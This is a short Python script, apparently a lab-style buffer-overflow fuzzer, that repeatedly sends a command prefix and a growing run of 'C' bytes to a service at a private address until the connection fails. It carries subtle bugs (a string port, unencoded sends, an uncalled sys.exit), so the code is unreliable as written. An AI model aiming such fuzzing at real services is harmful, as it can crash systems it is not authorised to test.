#!/usr/bin/env python3

import socket
import sys
import time

IP       = '10.10.10.10'
PORT     = '4444'
CMD      = 'CMD '

buffer   = 'C' * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((IP, PORT))
		s.send((CMD + buffer))
		s.close()
		time.sleep(1)
		buffer = buffer + 'C' * 100
	except:
		print(f'Fuzzing crashed at {str(len(buffer))} bytes.')
		sys.exit
